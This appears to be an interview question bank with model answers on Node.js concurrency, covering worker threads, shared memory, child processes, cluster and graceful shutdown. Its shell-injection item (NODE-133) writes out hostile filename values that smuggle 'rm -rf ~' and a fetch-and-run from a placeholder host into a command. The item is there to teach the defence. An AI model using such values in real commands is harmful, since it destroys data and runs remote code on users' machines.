# NODE03 — Concurrency, workers, and processes

Node.js 20/22. Questions NODE-101–NODE-150.

These questions cover running work in parallel: `worker_threads`, structured clone and transferables, `SharedArrayBuffer` and `Atomics`, worker pools, `child_process`, `cluster`, `MessageChannel`, graceful shutdown, and the isolation limits of `vm`. Event-loop phases and microtask ordering are NODE02; this section assumes them.

Async is not parallel: `async`/`await` interleaves work on one JavaScript thread, while workers, processes, and the libuv pool run work on other OS threads or processes. `UV_THREADPOOL_SIZE` sizes libuv's native pool and does not run your JavaScript. Workers never share JavaScript objects; only `SharedArrayBuffer` memory is shared.

### NODE-101 — Why async is not parallel

**Difficulty:** Intermediate

**Category:** Async vs parallel

**Question:**

A teammate says wrapping CPU-heavy functions in `async` and awaiting them with `Promise.all` makes them run in parallel. Is that true in Node?

**Answer:**

No. `async` interleaves continuations on one JavaScript thread; it does not create threads. A CPU-bound function runs to completion on the main thread before the loop can run anything else, so `Promise.all` over ten of them takes about ten times as long as one. Async helps when work is waiting on I/O that the OS or libuv performs elsewhere. For CPU parallelism you need workers, child processes, or cluster.

**Follow-up:**

How would you spot this in production?

Answer: Rising event-loop delay and p99 latency, timers firing late, and one CPU core pinned near 100% while others idle. `perf_hooks.monitorEventLoopDelay()` makes the stall visible.

### NODE-102 — Why I/O scales on one thread and CPU does not

**Difficulty:** Intermediate

**Category:** Async vs parallel

**Question:**

Why can one Node thread serve thousands of concurrent sockets but not thousands of concurrent hash computations?

**Answer:**

Socket I/O is handed to the OS (epoll, kqueue, IOCP); JavaScript only runs briefly when data is ready, so waiting costs no thread. A JavaScript computation holds the thread for its whole duration, and nothing else on that thread, including every other connection's callbacks, can run meanwhile. Concurrency of waiting is cheap; concurrency of computing needs more cores.

**Follow-up:**

Is the cost always CPU time?

Answer: No. Anything synchronous blocks: `fs.readFileSync`, large `JSON.parse`, catastrophic regex backtracking, and `zlib.*Sync` all hold the loop even without much CPU parallelism to gain.

### NODE-103 — Options for CPU-heavy work

**Difficulty:** Intermediate

**Category:** Async vs parallel

**Question:**

A request handler must resize images or hash large payloads. List the ways to keep the event loop responsive and when you would pick each.

**Answer:**

Worker threads for in-process CPU work with cheap messaging. Child processes for other binaries or hard isolation. Cluster or multiple replicas to scale request handling across cores. Native addons or async crypto/zlib that use libuv's pool. Chunking with `setImmediate` for small slices of work. A separate service or queue worker when the job is long or must survive restarts. Choose by isolation needs, payload size, and whether the work is request-scoped or background.

**Follow-up:**

Why is chunking with `setImmediate` a weak default?

Answer: It only yields; the total CPU time is unchanged and still on the main thread, and slicing logic adds complexity. It suits small, interruptible loops, not heavy compute.

### NODE-104 — What a worker thread is

**Difficulty:** Intermediate

**Category:** worker_threads

**Question:**

What is a `worker_threads` worker, and how does it differ from a thread in Java or C++?

**Answer:**

A worker is an extra V8 isolate with its own heap, event loop, and module graph, running on its own OS thread inside the same process. It cannot touch the parent's JavaScript objects. Communication is by message passing (structured clone) or by shared `SharedArrayBuffer` memory. Unlike Java or C++ threads there are no shared mutable objects and no locks over a common heap. Startup is on the order of tens of milliseconds and several megabytes per worker, so you pool them.

**Follow-up:**

Does a worker share `require` cache or module state with the parent?

Answer: No. Each worker loads its own copy of modules; module-level singletons such as DB clients are per worker.

### NODE-105 — Minimal worker_threads program

**Difficulty:** Intermediate

**Category:** worker_threads

**Question:**

Write the smallest ESM file that runs a computation in a worker and returns the result to the main thread.

**Answer:**

```js
import { Worker, isMainThread, parentPort, workerData } from 'node:worker_threads';

if (isMainThread) {
  const w = new Worker(new URL(import.meta.url), { workerData: 21 });
  w.on('message', (m) => console.log(m));   // 42
  w.on('error', console.error);
} else {
  parentPort.postMessage(workerData * 2);
}
```

`workerData` is cloned once at startup; later data goes through `parentPort.postMessage`.

**Follow-up:**

How do you await a one-shot result?

Answer: Wrap it in a Promise that resolves on `'message'` and rejects on `'error'` and on `'exit'` with a non-zero code, then clean up listeners.

### NODE-106 — What postMessage does to its payload

**Difficulty:** Intermediate

**Category:** Structured clone

**Question:**

What happens to an object passed to `worker.postMessage()`, and what can it not carry?

**Answer:**

It is copied with the structured clone algorithm. Supported: primitives, plain objects, arrays, `Map`, `Set`, `Date`, `RegExp`, `BigInt`, typed arrays, `ArrayBuffer`, and `Error` (with limits). Not supported: functions (throws `DataCloneError`), symbols as values, and prototype/class identity, so a class instance arrives as a plain object without methods. The copy is O(size), so very large payloads can cost more than the work saved.

**Follow-up:**

Does mutating the object after `postMessage` affect the receiver?

Answer: No. The clone is taken at send time; both sides then have independent objects.

### NODE-107 — Transferables and when to use them

**Difficulty:** Senior

**Category:** Transferables

**Question:**

What is a transferable object, and when does using one beat a normal `postMessage`?

**Answer:**

A transferable moves ownership instead of copying. `ArrayBuffer` and `MessagePort` are the common ones (also `FileHandle`, `X509Certificate`-style handles in some versions). `port.postMessage(buf, [buf])` is O(1) regardless of size. Use it for large binary payloads such as image frames, audio, or parsed buffers. The tradeoff is that the sender loses access.

**Follow-up:**

What do you pass in the transfer list for a typed array?

Answer: The underlying `ArrayBuffer`: `postMessage(view, [view.buffer])`. Transferring the view alone does not detach anything.

### NODE-108 — State of a transferred ArrayBuffer

**Difficulty:** Senior

**Category:** Transferables

**Question:**

After `postMessage(buf, [buf])`, what is the state of `buf` on the sender, and what happens if you transfer it again?

**Answer:**

It is detached: `buf.byteLength` is `0` and views over it have length `0`, so reads return nothing useful. Only the receiver owns the memory. Transferring a detached buffer again throws `DataCloneError`. Keep one clear owner per buffer and design the protocol so buffers return to the sender or are replaced.

**Follow-up:**

How do pools reuse buffers without reallocating?

Answer: Send the buffer back to the parent by transfer after the worker is done, forming a ring, or use `SharedArrayBuffer` with explicit synchronization.

### NODE-109 — What SharedArrayBuffer is

**Difficulty:** Senior

**Category:** SharedArrayBuffer

**Question:**

What is a `SharedArrayBuffer`, and how does it differ from transferring an `ArrayBuffer`?

**Answer:**

A fixed-size block of memory that several threads map at once. Each thread wraps it in its own typed array (`new Int32Array(sab)`) and sees the same bytes. Posting it shares the memory; nothing is copied or detached. It is the only mutable shared memory between workers. Because access is concurrent, you must synchronize with `Atomics` or accept races.

**Follow-up:**

Can it hold JavaScript objects?

Answer: No. Only bytes, interpreted through typed arrays or `DataView`. Structured data needs a manual binary layout.

### NODE-110 — Why Atomics are needed

**Difficulty:** Senior

**Category:** SharedArrayBuffer

**Question:**

Two workers run `counter[0]++` on a shared `Int32Array` 100,000 times each. Why is the result wrong, and what fixes it?

**Answer:**

`counter[0]++` is read, add, write; two threads can read the same value and both write back, losing increments, and plain accesses carry no ordering guarantees. `Atomics.add(counter, 0, 1)` performs the operation indivisibly with sequentially consistent ordering. Also available: `load`, `store`, `exchange`, `compareExchange`, `and`, `or`, `xor`, `sub`.

**Follow-up:**

Which typed arrays work with `Atomics`?

Answer: Integer typed arrays over a buffer, such as `Int32Array`, `Uint32Array`, and `BigInt64Array`. Not floats or clamped arrays.

### NODE-111 — Atomics.wait and notify

**Difficulty:** Senior

**Category:** SharedArrayBuffer

**Question:**

How do `Atomics.wait`, `Atomics.notify`, and `Atomics.waitAsync` work, and where should each be used?

**Answer:**

`Atomics.wait(i32, idx, expected, timeoutMs)` blocks the calling thread while the value equals `expected` until notified or timed out. `Atomics.notify(i32, idx, count)` wakes waiters. `Atomics.waitAsync` returns a promise and does not block. Node permits `wait` on the main thread, but doing so freezes the event loop, so use blocking `wait` only inside workers and `waitAsync` where the loop must stay free. Always re-check the condition in a loop to handle spurious wakeups.

**Follow-up:**

What does `wait` return?

Answer: `"ok"` if notified, `"not-equal"` if the value did not match at call time, `"timed-out"` after the timeout.

### NODE-112 — A mutex built on Atomics

**Difficulty:** Staff

**Category:** SharedArrayBuffer

**Question:**

Sketch a mutex using a shared `Int32Array` cell, and name its failure modes.

**Answer:**

States: `0` unlocked, `1` locked. Lock: loop on `Atomics.compareExchange(i32, 0, 0, 1)`; if it returns non-zero, `Atomics.wait(i32, 0, 1)`. Unlock: `Atomics.store(i32, 0, 0)` then `Atomics.notify(i32, 0, 1)`. Failure modes: a worker that crashes while holding the lock leaves it stuck, no fairness or ordering, lock-order deadlocks with multiple cells, and blocking `wait` on the main thread. Use timeouts and keep critical sections tiny.

**Follow-up:**

When would you avoid this entirely?

Answer: When a single owner worker can serialize access through messages. Message passing is simpler and avoids lock bugs unless profiling proves copy cost matters.

### NODE-113 — Pitfalls of shared memory

**Difficulty:** Senior

**Category:** SharedArrayBuffer

**Question:**

What are the main risks of using `SharedArrayBuffer` in a Node service, compared with message passing?

**Answer:**

Data races without `Atomics`, torn or inconsistent multi-field updates (only single integer cells are atomic), hand-written binary layouts, lock-order deadlocks, hard-to-reproduce bugs, and no automatic cleanup if a worker dies mid-update. The buffer is also fixed-size. Benefits are zero-copy and low latency, which matter only for large or very high-frequency data.

**Follow-up:**

How do you update several fields consistently?

Answer: Guard them with a lock, use a sequence counter (seqlock) that readers retry on change, or write a new version into a separate slot and publish an index atomically.

### NODE-114 — No shared JavaScript objects

**Difficulty:** Intermediate

**Category:** Isolation

**Question:**

Can two workers share a JavaScript object, such as a `Map` of cache entries?

**Answer:**

No. Each worker has a separate V8 heap; sending a `Map` produces an independent clone, and mutations never propagate. Cross-worker state needs message passing to an owner, a `SharedArrayBuffer` with a custom layout, or an external store such as Redis. Module-level variables are per worker, so an in-memory cache duplicates across workers and across cluster processes.

**Follow-up:**

Why can't engines simply share a heap?

Answer: V8 isolates are single-threaded by design: objects, GC, and hidden-class state assume one mutator. Sharing would require locks on every access.

### NODE-115 — What a worker pool is for

**Difficulty:** Intermediate

**Category:** Pools

**Question:**

Why use a worker pool instead of creating a worker per task?

**Answer:**

Each worker costs startup time (new isolate, module loading) and memory. A pool keeps a fixed number of long-lived workers plus a task queue, amortizing startup, bounding CPU and memory, and creating natural backpressure when load exceeds capacity. Per-request workers allow unbounded concurrency under load and can exhaust memory.

**Follow-up:**

What happens to requests when all workers are busy?

Answer: They wait in the queue. Bound the queue and fail fast or shed load rather than letting latency grow without limit.

### NODE-116 — Designing a worker pool

**Difficulty:** Senior

**Category:** Pools

**Question:**

Outline the core mechanics of a promise-based worker pool.

**Answer:**

Keep an idle-worker list, a FIFO queue, and a map from task id to `{resolve, reject}`. `run(payload)` returns a promise; if a worker is idle, mark it busy and `postMessage({id, payload})`, otherwise enqueue. On `'message'`, settle by id, mark the worker idle, and pull the next queued task. On `'error'` or `'exit'`, reject the in-flight task and spawn a replacement. Add a queue limit, per-task timeout, and a `destroy()` that drains and terminates.

**Follow-up:**

How do you cancel a task that is already running?

Answer: You cannot interrupt synchronous JS in a worker cooperatively; terminate and replace that worker, or have long tasks check a shared flag or message periodically.

### NODE-117 — Use a library or write a pool

**Difficulty:** Intermediate

**Category:** Pools

**Question:**

Which pool libraries exist, and why prefer one over a hand-rolled pool?

**Answer:**

`piscina` is the common choice (queueing, `AbortSignal` cancellation, idle timeouts, resource limits, transferables support); `workerpool` and `threads.js` are alternatives. Libraries cover crash recovery, respawn, task timeouts, and shutdown ordering, where hand-rolled pools often leak workers or hang. A hand-rolled pool is acceptable for a single task type with simple needs.

**Follow-up:**

What do you still own when using one?

Answer: Pool sizing, queue bounds, payload design (transfer vs clone), error mapping, and shutdown wiring into your process lifecycle.

### NODE-118 — Sizing a pool

**Difficulty:** Senior

**Category:** Pools

**Question:**

How many workers should a CPU-bound pool have on a container limited to 2 CPUs?

**Answer:**

Roughly the CPU quota available to the process, often `availableParallelism()` or one less to leave room for the main thread. In containers, `os.cpus().length` reports host cores and can mislead; `os.availableParallelism()` is better but may not reflect cgroup quotas on every Node/libuv version, so verify or read the limit explicitly. Oversizing adds context switching and memory without throughput. For I/O-heavy tasks inside workers, measure instead of assuming.

**Follow-up:**

How do you validate the choice?

Answer: Load test with throughput and p99 as pool size varies, watching CPU throttling in the container and queue depth.

### NODE-119 — UV_THREADPOOL_SIZE versus worker threads

**Difficulty:** Senior

**Category:** Threadpool vs workers

**Question:**

What is the difference between `UV_THREADPOOL_SIZE` and `worker_threads`?

**Answer:**

`UV_THREADPOOL_SIZE` (default 4, max 1024) sets the size of libuv's process-wide pool for native blocking work: many `fs` operations, `dns.lookup`, `crypto.pbkdf2`/`scrypt`/`randomBytes`, `zlib`. Those threads run C/C++ code, never your JavaScript. Worker threads run JavaScript in separate isolates. Raising the env var gives more native concurrency; it does not make a JS loop faster. Set it in the environment before the process starts, or at least before the pool is first used.

**Follow-up:**

Do workers get their own libuv pool?

Answer: Each worker has its own event loop, but the threadpool is shared process-wide, so heavy native work in several workers competes for the same threads.

### NODE-120 — What uses the libuv threadpool

**Difficulty:** Senior

**Category:** Threadpool vs workers

**Question:**

Which Node operations run on the libuv threadpool, and which do not?

**Answer:**

On the pool: most asynchronous `fs` calls, `dns.lookup` (`getaddrinfo`), `crypto.pbkdf2`, `scrypt`, `randomBytes`/`randomFill`, `zlib` async methods, and some native addons. Not on the pool: TCP/UDP/HTTP socket I/O (OS async mechanisms), `dns.resolve*` (c-ares), timers, and your JavaScript. Knowing the split explains why a flood of slow file operations can delay unrelated DNS lookups.

**Follow-up:**

Why is `dns.lookup` the surprising one?

Answer: It looks like network I/O but calls the blocking `getaddrinfo`, so slow DNS can starve the four default pool threads and stall `fs` calls.

### NODE-121 — Diagnosing threadpool saturation

**Difficulty:** Senior

**Category:** Threadpool vs workers

**Question:**

Event-loop delay is low and CPU is not saturated, yet file reads and password hashing are slow under load. What do you suspect?

**Answer:**

Threadpool saturation. With four threads, a fifth concurrent `pbkdf2` or slow `fs` operation queues behind the others even though the JS thread is idle. Confirm by timing the operations in isolation and under load, and by checking whether latency scales with concurrent native calls. Fixes: raise `UV_THREADPOOL_SIZE`, limit concurrency of heavy native calls, separate slow filesystems, or move work to workers or another service.

**Follow-up:**

Is bigger always better?

Answer: No. Too many threads cause contention and memory use; size it from measured native concurrency and available cores.

### NODE-122 — Misconceptions about UV_THREADPOOL_SIZE

**Difficulty:** Intermediate

**Category:** Threadpool vs workers

**Question:**

Does raising `UV_THREADPOOL_SIZE` speed up a JSON-parsing or business-logic hot path?

**Answer:**

No. That code is JavaScript on the main thread and never touches the libuv pool. The setting only adds parallelism for native tasks routed through libuv. For CPU-bound JS, offload to workers or reduce the work. Applying the knob to the wrong problem is a common interview and production mistake.

**Follow-up:**

How do you tell which kind of bottleneck you have?

Answer: A CPU profile that shows time in JS frames points to the main thread or workers; time waiting on `fs`/crypto/dns calls with an idle loop points to the pool.

### NODE-123 — What MessageChannel provides

**Difficulty:** Intermediate

**Category:** MessageChannel

**Question:**

What is a `MessageChannel`, and what does it give you over `worker.postMessage`?

**Answer:**

It creates two entangled `MessagePort` objects. A message posted on one arrives on the other, using structured clone. Ports are transferable, so you can hand one end to a worker to create a dedicated channel, for example per request or per feature, or between two workers directly. This avoids routing everything through a single `parentPort` and the main thread.

**Follow-up:**

Are messages ordered?

Answer: Yes, per port, in send order. There is no ordering guarantee across different ports.

### NODE-124 — Connecting two workers directly

**Difficulty:** Senior

**Category:** MessageChannel

**Question:**

How do you let worker A and worker B talk without the main thread relaying messages?

**Answer:**

```js
const { port1, port2 } = new MessageChannel();
workerA.postMessage({ peer: port1 }, [port1]);
workerB.postMessage({ peer: port2 }, [port2]);
```

Each worker listens with `peer.on('message', ...)`. Ports must be in the transfer list; trying to clone them throws. After the handoff the main thread is out of the data path.

**Follow-up:**

What if one worker dies?

Answer: The other port is not automatically fatal, but messages go nowhere; listen for `'close'` on the port and handle peer loss explicitly.

### NODE-125 — Ports and workers keeping the process alive

**Difficulty:** Intermediate

**Category:** MessageChannel

**Question:**

A script using a `MessagePort` never exits. Why, and how do you fix it?

**Answer:**

A port with a `'message'` listener (or after `.start()`/`.ref()`) is an active handle and keeps the event loop open. Call `port.close()` when finished, or `port.unref()` if it should not hold the process open. A running `Worker` also keeps the parent alive until it exits unless you `worker.unref()`.

**Follow-up:**

What does `unref` change for correctness?

Answer: The process may exit while messages are still in flight, so only unref for best-effort background work.

### NODE-126 — How worker errors surface

**Difficulty:** Senior

**Category:** Worker errors

**Question:**

What happens to the parent when a worker throws an uncaught exception?

**Answer:**

The worker stops and the parent receives an `'error'` event on the `Worker` object with the error, followed by `'exit'` with a non-zero exit code. If the parent has no `'error'` listener, the `EventEmitter` rule applies and the error is thrown in the parent, potentially crashing it. `'messageerror'` fires when a received message cannot be deserialized. Always register `'error'`, `'messageerror'`, and `'exit'`.

**Follow-up:**

Is a rejected promise inside the worker an error event?

Answer: An unhandled rejection in the worker follows normal Node rules (by default it becomes an uncaught exception and triggers the same path). Handle it in the worker too.

### NODE-127 — Can a worker crash the whole process

**Difficulty:** Senior

**Category:** Worker errors

**Question:**

Can a worker bring down the main process, and under what conditions?

**Answer:**

A JavaScript exception or heap limit inside a worker kills only that worker and surfaces as events in the parent; set `resourceLimits` so a runaway worker fails with `ERR_WORKER_OUT_OF_MEMORY` instead of consuming the machine. The parent can still crash if it fails to handle the `'error'` event, or if the process-level OOM killer acts. A fault in native code (segfault in an addon) kills the entire process because workers share it. For hard fault isolation use child processes.

**Follow-up:**

Where do you attach `process.on('uncaughtException')` for workers?

Answer: Inside the worker, for logging and exit; in the parent it does not catch errors originating inside a worker thread.

### NODE-128 — Limiting a worker's resources

**Difficulty:** Senior

**Category:** Worker errors

**Question:**

How do you cap memory for a worker, and what happens when the cap is hit?

**Answer:**

Pass `resourceLimits` to the constructor: `{ maxOldGenerationSizeMb, maxYoungGenerationSizeMb, codeRangeSizeMb, stackSizeMb }`. When the old-generation limit is exceeded, the worker terminates and the parent receives an error with code `ERR_WORKER_OUT_OF_MEMORY`. These limits constrain the V8 heap, not off-heap memory such as `Buffer`/`ArrayBuffer` allocations, so total RSS can still exceed them.

**Follow-up:**

What should the pool do after such an exit?

Answer: Reject the in-flight task, log with the task id, and spawn a replacement worker so capacity recovers.

### NODE-129 — Stopping a worker

**Difficulty:** Intermediate

**Category:** worker_threads

**Question:**

Compare `worker.terminate()` with a cooperative shutdown message.

**Answer:**

`worker.terminate()` returns a promise and stops JavaScript execution as soon as possible; the worker gets no chance to flush or release resources. A cooperative shutdown sends a message so the worker finishes the current task, closes its handles, and exits on its own. Good practice is cooperative first, then `terminate()` after a timeout, and awaiting the `'exit'` event.

**Follow-up:**

What does `terminate()` do to messages in flight?

Answer: Pending messages may be dropped and in-flight tasks never resolve, so the parent must reject outstanding promises itself.

### NODE-130 — When workers do not help

**Difficulty:** Intermediate

**Category:** worker_threads

**Question:**

Should you put an HTTP client or database queries into worker threads to improve throughput?

**Answer:**

Usually no. The main loop already handles I/O concurrency efficiently, and workers add memory, startup, and message-copy overhead. Workers pay off for CPU-bound JavaScript such as hashing, compression in JS, image or PDF processing, and parsing very large documents. Exceptions are isolating flaky code or running a blocking synchronous native library.

**Follow-up:**

How would you prove a worker is worth it?

Answer: Benchmark end-to-end latency and throughput with and without it, including message serialization cost, not just the compute time.

### NODE-131 — child_process versus workers

**Difficulty:** Intermediate

**Category:** child_process

**Question:**

When do you spawn a child process instead of a worker thread?

**Answer:**

When you need a different program or language, a stronger fault and memory boundary, different environment variables or privileges, or the ability to kill and restart without affecting the parent. Cost: higher startup and memory per process and IPC by pipes with serialization. Workers are lighter and can share memory buffers; processes are safer and isolated by the OS.

**Follow-up:**

Which gives better protection from a native crash?

Answer: Processes. A segfault in a worker's native addon takes down the whole process; a crashed child only ends itself.

### NODE-132 — spawn, exec, execFile, and fork

**Difficulty:** Intermediate

**Category:** child_process

**Question:**

Compare `spawn`, `exec`, `execFile`, and `fork`.

**Answer:**

`spawn(cmd, args)` streams stdio, uses no shell by default, and has no output size limit, so it suits long-running or large-output commands. `exec(cmdString)` runs through a shell and buffers output into a callback, limited by `maxBuffer`. `execFile(file, args)` buffers like `exec` but skips the shell, which is safer. `fork(modulePath)` spawns a new Node process running a script with an IPC channel for `send`/`message`. Default to `execFile` or `spawn` with an argument array.

**Follow-up:**

Which do you use for a long-running `ffmpeg` job with progress output?

Answer: `spawn`, reading stdout/stderr as streams, with `'close'` to detect completion and an `AbortSignal` or `kill` for cancellation.

### NODE-133 — Shell injection with exec

**Difficulty:** Intermediate

**Category:** child_process

**Question:**

Why is `exec(\`convert ${userFile} out.png\`)` dangerous, and what is the fix?

**Answer:**

The whole string is parsed by a shell, so a filename like `a.png; rm -rf ~` or `$(curl evil|sh)` executes extra commands. Use `execFile('convert', [userFile, 'out.png'])` or `spawn` with an argument array and no `shell: true`, so arguments are never interpreted by a shell. Also validate paths and use an allowlist for binaries; arguments beginning with `-` can still be parsed as options by the target program.

**Follow-up:**

Does `execFile` fully remove injection risk?

Answer: It removes shell injection, but argument injection remains possible; use `--` where supported and validate inputs.

### NODE-134 — exec maxBuffer overflow

**Difficulty:** Intermediate

**Category:** child_process

**Question:**

What happens when a command run with `exec` prints more than `maxBuffer`?

**Answer:**

The child is terminated and the callback receives an error (`ERR_CHILD_PROCESS_STDIO_MAXBUFFER`) while output captured so far may be truncated. The default is 1 MiB. Use `spawn` and process the streams incrementally, or raise `maxBuffer` only when the output is bounded and small enough to hold in memory.

**Follow-up:**

Which is safer for unknown output size?

Answer: Streaming with `spawn`, writing to a file or piping to a consumer, so memory stays bounded.

### NODE-135 — IPC with fork

**Difficulty:** Senior

**Category:** child_process

**Question:**

How does messaging work between a parent and a `fork`ed child, and what serialization applies?

**Answer:**

The parent uses `child.send(msg)` and `child.on('message')`; the child uses `process.send(msg)` and `process.on('message')`. The default `serialization` is `'json'`, so messages are JSON-encoded (no `Map`, `BigInt`, or `undefined` fidelity); `'advanced'` uses structured clone. Handles such as sockets and servers can be passed as a second argument to `send`. Call `child.disconnect()` (or let it exit) so the IPC channel does not keep processes alive.

**Follow-up:**

How do you know the channel is closed?

Answer: Listen for `'disconnect'`, and check `child.connected` before sending to avoid `ERR_IPC_CHANNEL_CLOSED`.

### NODE-136 — Handling child exit correctly

**Difficulty:** Senior

**Category:** child_process

**Question:**

What is the difference between the `'error'`, `'exit'`, and `'close'` events on a child process?

**Answer:**

`'error'` fires when the process could not be spawned (such as `ENOENT`), could not be killed, or an IPC send failed; it is not an exit. `'exit'` fires when the process ends, with `code` or `signal`, but stdio streams may still hold unread data. `'close'` fires after the process has ended and its stdio streams have closed, so it is the safe point to finalize collected output. Always check both `code` and `signal`.

**Follow-up:**

Can both `'error'` and `'exit'` fire?

Answer: Yes in some cases, so make completion handling idempotent.

### NODE-137 — Killing a child and its tree

**Difficulty:** Senior

**Category:** child_process

**Question:**

`child.kill()` does not stop the grandchildren your command started. How do you terminate the whole tree?

**Answer:**

`kill()` signals only the direct child. On POSIX, start the child with `detached: true` so it leads a new process group, then `process.kill(-child.pid, 'SIGTERM')` signals the group. Alternatively use a helper such as `tree-kill`, or pass an `AbortSignal` via the `signal` option for the direct process. Using `shell: true` adds a shell layer that can outlive the target, which is another reason to avoid it. Escalate to `SIGKILL` after a timeout.

**Follow-up:**

What changes on Windows?

Answer: Process groups and signals differ; `taskkill /T /F /PID` is the usual approach for trees.

### NODE-138 — stdio options and blocked children

**Difficulty:** Senior

**Category:** child_process

**Question:**

A spawned child hangs forever after printing a lot of output. What is a likely cause?

**Answer:**

With the default `stdio: 'pipe'`, the parent must read the child's stdout and stderr. If it does not, the OS pipe buffer fills and the child blocks on write. Fix by consuming or piping both streams, or setting them to `'ignore'` or `'inherit'`. Do not forget stderr.

**Follow-up:**

When is `'inherit'` appropriate?

Answer: For CLIs and dev tooling where the child should write directly to the parent's terminal; it gives no programmatic access to the output.

### NODE-139 — What cluster does

**Difficulty:** Intermediate

**Category:** cluster

**Question:**

What does the `cluster` module do and what problem does it solve?

**Answer:**

A primary process forks several worker processes, each running a copy of the app. Workers that call `listen()` on the same port share it through the primary, so connections spread across cores. It scales request handling across CPUs and gives crash isolation per worker. Workers are separate processes with separate memory, so there is no shared in-memory state.

**Follow-up:**

Is cluster built on workers or processes?

Answer: Processes, via `child_process.fork`, not `worker_threads`.

### NODE-140 — Basic cluster usage

**Difficulty:** Intermediate

**Category:** cluster

**Question:**

Write a minimal cluster server that forks one worker per core and replaces workers that die.

**Answer:**

```js
import cluster from 'node:cluster';
import http from 'node:http';
import { availableParallelism } from 'node:os';

if (cluster.isPrimary) {
  for (let i = 0; i < availableParallelism(); i++) cluster.fork();
  cluster.on('exit', (w, code, sig) => {
    console.error(`worker ${w.process.pid} died`, code, sig);
    cluster.fork();
  });
} else {
  http.createServer((_, res) => res.end('ok')).listen(3000);
}
```

`isPrimary` replaces the deprecated `isMaster`. Add backoff so a crash loop does not respawn endlessly.

**Follow-up:**

What stops a crash loop?

Answer: Exponential backoff or a max-restart rate, plus alerting, because respawning a worker that fails at startup burns CPU.

### NODE-141 — How cluster distributes connections

**Difficulty:** Senior

**Category:** cluster

**Question:**

How does cluster decide which worker gets a connection?

**Answer:**

Default `cluster.SCHED_RR` (everywhere except Windows): the primary accepts connections and passes them to workers round-robin. `SCHED_NONE` leaves it to the OS, where workers accept directly; this can skew heavily toward a few workers. Set with `cluster.schedulingPolicy` or `NODE_CLUSTER_SCHED_POLICY`. Balancing is per connection, so long-lived keep-alive connections can still produce uneven request load.

**Follow-up:**

Why can load still be uneven with round-robin?

Answer: Connections are assigned, not requests; a few busy keep-alive clients pinned to one worker can dominate it.

### NODE-142 — Cluster versus worker_threads

**Difficulty:** Senior

**Category:** cluster

**Question:**

When do you choose cluster, and when worker threads?

**Answer:**

Cluster scales a network server across cores with process-level fault isolation and one event loop per process; workers do not share memory. Worker threads offload CPU-bound tasks from a loop within one process, with cheaper messaging and optional shared memory. They solve different problems and can be combined: cluster for request parallelism, a worker pool per process for heavy tasks. In containers and Kubernetes, multiple single-process replicas often replace cluster.

**Follow-up:**

Why might replicas beat cluster on Kubernetes?

Answer: The orchestrator already handles restarts, health checks, scaling, and resource limits per pod, which makes an in-container supervisor redundant.

### NODE-143 — Limits of cluster

**Difficulty:** Senior

**Category:** cluster

**Question:**

What breaks or gets harder when you move an app to cluster?

**Answer:**

In-memory state diverges: sessions, caches, rate-limit counters, and WebSocket rooms differ per worker and need Redis or sticky sessions. Memory is duplicated per process, startup cost multiplies, and the primary's round-robin hand-off is a throughput ceiling at extreme connection rates. Scheduled jobs run once per worker unless guarded. Debugging and log correlation need a worker id.

**Follow-up:**

How do you run a cron job once?

Answer: Run it only in the primary or in one designated worker, or use an external scheduler or a distributed lock.

### NODE-144 — Zero-downtime restart with cluster

**Difficulty:** Staff

**Category:** cluster

**Question:**

Describe a rolling restart that drops no requests.

**Answer:**

On a signal such as `SIGUSR2`, the primary restarts workers one at a time: fork a replacement, wait for its `'listening'` event, then call `oldWorker.disconnect()`. The old worker stops accepting new connections, finishes in-flight requests, and exits; the primary escalates with `kill` if it exceeds a timeout. Repeat until all are replaced. This keeps capacity at or above N−1 and lets a bad deploy be halted if new workers fail to become ready.

**Follow-up:**

What do long-lived connections do during this?

Answer: They keep the old worker alive until closed. Set a drain deadline and signal clients to reconnect, otherwise the restart stalls.

### NODE-145 — Why graceful shutdown matters

**Difficulty:** Intermediate

**Category:** Graceful shutdown

**Question:**

What is a graceful shutdown, and why does it matter during deploys?

**Answer:**

On `SIGTERM` (or `SIGINT`) the process stops accepting new work, lets in-flight requests and jobs finish, closes database and queue connections, flushes logs, and exits with code 0. Without it, deploys drop requests and may leave jobs or transactions half done. Orchestrators such as Kubernetes send `SIGTERM`, wait a grace period, then `SIGKILL`, so your own drain timeout must be shorter than that period.

**Follow-up:**

Why also handle readiness during shutdown?

Answer: Fail the readiness probe first so the load balancer stops routing new traffic; otherwise requests arrive while you are closing.

### NODE-146 — Graceful shutdown for an HTTP server

**Difficulty:** Senior

**Category:** Graceful shutdown

**Question:**

Write a shutdown handler for an `http.Server` that has a hard timeout.

**Answer:**

```js
let closing = false;
function shutdown(signal) {
  if (closing) return;
  closing = true;
  console.log(`${signal}: draining`);
  const t = setTimeout(() => process.exit(1), 10_000);
  t.unref();
  server.close(async (err) => {
    try { await db.end(); } finally { process.exit(err ? 1 : 0); }
  });
  server.closeIdleConnections(); // Node 18.2+
}
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));
```

`server.close()` stops new connections but waits for existing ones; since Node 19 it also closes idle keep-alive connections, and `closeAllConnections()` can force the rest.

**Follow-up:**

Why guard against a second signal?

Answer: Repeated signals would run shutdown twice and double-close resources; make shutdown idempotent.

### NODE-147 — Shutdown with workers and children

**Difficulty:** Senior

**Category:** Graceful shutdown

**Question:**

How do you include worker pools, child processes, and cluster workers in graceful shutdown?

**Answer:**

Order matters: stop intake, drain, release resources, exit. For a worker pool, reject or finish queued tasks, wait for in-flight ones, then destroy the pool or `terminate()` workers after a timeout. For children, send `SIGTERM`, wait for `'close'`, escalate to `SIGKILL`. In cluster, the primary calls `worker.disconnect()` on each worker and waits for exits. Forward the signal explicitly, since children do not automatically stop when the parent receives `SIGTERM` in all setups.

**Follow-up:**

What if the parent is killed with `SIGKILL`?

Answer: Nothing runs; children may be orphaned. Use process groups, supervisors, or child-side checks such as IPC `'disconnect'` to exit when the parent disappears.

### NODE-148 — vm versus worker isolation

**Difficulty:** Staff

**Category:** Isolation

**Question:**

Compare `node:vm`, worker threads, and child processes as isolation mechanisms.

**Answer:**

`vm` creates a separate global object (context) but shares the thread, the heap, and the event loop with the host. It is not a security boundary, cannot be preempted except by `timeout` on synchronous code, and shares memory pressure. A worker has its own isolate, heap, and event loop, can be given `resourceLimits`, and can be terminated, but shares the process, so a native crash or process-level resource exhaustion still affects the host. A child process gives OS-level isolation (memory, crash, privileges). Choose by threat model: `vm` for convenience scoping of trusted code, workers for CPU and heap isolation, processes or containers for untrusted code.

**Follow-up:**

Why does `vm` not isolate memory?

Answer: Objects from the context and the host live on the same V8 heap; allocation in the sandbox counts against the host process and can trigger its GC or OOM.

